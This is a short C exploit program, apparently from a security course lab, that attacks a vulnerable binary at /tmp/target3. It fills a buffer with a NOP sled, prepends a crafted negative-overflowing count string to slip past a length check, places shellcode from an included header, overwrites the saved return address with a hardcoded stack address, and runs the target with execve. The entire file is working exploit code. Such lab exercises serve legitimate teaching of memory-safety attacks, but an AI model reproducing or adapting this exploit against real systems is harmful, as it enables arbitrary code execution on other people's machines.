#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];
  char buffer[202 * 16]; // we lose the first 11 from the count and we need 8 for the EIP so 19 total which is why we need not 1 but 2 more structs 

  int i;
  for (i = 0; i < 3232; i++)
  {
    buffer[i] = 0x90;
  }

  strncpy(buffer, "2147483850,", 11);
  strncpy(buffer + 1600, shellcode, 45);

  *((int *)(buffer + (200 * 16) + 15)) = 0xbfffe548;

  args[0] = TARGET;
  args[1] = buffer;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}